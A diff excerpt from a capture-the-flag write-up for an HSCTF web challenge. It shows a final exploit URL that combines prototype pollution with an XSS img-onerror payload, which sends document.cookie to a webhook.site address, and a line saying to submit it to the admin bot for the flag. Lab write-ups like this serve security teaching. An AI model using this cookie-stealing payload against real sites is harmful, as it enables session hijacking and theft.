@@ -107,3 +107,5 @@ Our final payload looks like this :
 ```
 http://fancier-page.hsctf.com/display.html?__proto__.img[0]=onerror&__proto__.img[1]=src&title=a&content=%3Cimg+src%3dx+onerror%3dwindow.location%3D%27http%3A%2F%2Fwebhook.site%2F0611881c-bc41-45f3-a8c9-de17092c579a%2F%3F%27%2Bdocument.cookie%3B%3E&background_color=%23ffffff&color=%23000000&font=Helvetica&font_size=16
 ``` 
+Then send, to admin bot to get the flag.
+![image](https://github.com/0xazr/ctf-writeups/assets/54212814/bc8a30d6-e8ec-4426-a10d-1b5c7176ff57)
